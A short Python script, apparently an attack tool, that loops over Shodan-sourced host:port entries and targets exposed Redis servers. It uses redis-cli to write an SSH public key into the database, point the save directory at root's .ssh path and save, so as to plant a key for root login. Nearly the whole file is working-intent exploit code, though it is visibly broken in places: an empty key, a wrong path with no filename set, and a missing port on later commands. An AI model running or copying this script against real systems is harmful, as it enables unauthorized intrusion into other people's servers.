import json
from subprocess import STDOUT, check_output

def process_payload(url):
    ip_and_port = url.replace('http://', '')
    if len(ip_and_port) > 25:
        return
    if ':' in ip_and_port:
        ip, port = ip_and_port.split(':')
    else:
        print("host error :" + ip_and_port)
        return
    print('trying:' + ip + ':' + port)
    ssh_public_key = ""
    cmd = "echo '\n\n " + ssh_public_key + "\n\n'|redis-cli -h " + ip + " -p " + port + " -x set test"
    # cmd = "echo 'bar' | redis-cli -h " + ip + " -p " + port + " -x set foo"
    try:
        output = check_output(cmd, shell=True, stderr=STDOUT, timeout=5)
        if 'OK' in str(output, "utf-8"):
            # print('[+]' + ip_and_port)
            output = check_output("echo 'config set dir /root/.ssh/authorized_key'|redis-cli -h " + ip + ' -x', shell=True, stderr=STDOUT, timeout=5)
            if 'OK' in str(output, "utf-8"):
                output = check_output("echo 'save'|redis-cli -h " + ip + ' -x', shell=True, stderr=STDOUT, timeout=5)
                print("save db result:" + str(output, "utf-8"))
                print('[+]', ip, port)
            else:
                print(output)
        else:
            print(output)
    except BaseException as e:
        print(e)
        return

if __name__ == '__main__':
    with open('shodan.json', 'r') as redis_content:
        urls = json.loads(redis_content.read())
        for url in urls:
            process_payload(url)
